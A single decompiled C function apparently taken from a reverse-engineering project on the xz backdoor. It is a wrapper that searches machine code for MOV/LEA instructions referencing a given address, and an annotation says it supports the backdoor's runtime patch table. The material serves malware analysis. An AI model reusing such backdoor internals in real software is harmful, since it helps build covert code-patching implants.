// /home/kali/xzre-ghidra/xzregh/101120_find_instruction_with_mem_operand.c
// Function: find_instruction_with_mem_operand @ 0x101120
// Calling convention: __stdcall
// Prototype: BOOL __stdcall find_instruction_with_mem_operand(u8 * code_start, u8 * code_end, dasm_ctx_t * dctx, void * mem_address)
/*
 * AutoDoc: Convenience wrapper that searches for MOV/LEA forms touching a specific address and reports the displacement. It feeds higher-level routines that locate struct fields for the backdoor's runtime patch table.
 */

#include "xzre_types.h"


BOOL find_instruction_with_mem_operand
               (u8 *code_start,u8 *code_end,dasm_ctx_t *dctx,void *mem_address)

{
  BOOL BVar1;
  
  BVar1 = find_lea_instruction_with_mem_operand(code_start,code_end,dctx,mem_address);
  if (BVar1 == 0) {
    BVar1 = find_instruction_with_mem_operand_ex(code_start,code_end,dctx,0x10b,mem_address);
    return BVar1;
  }
  return 1;
}

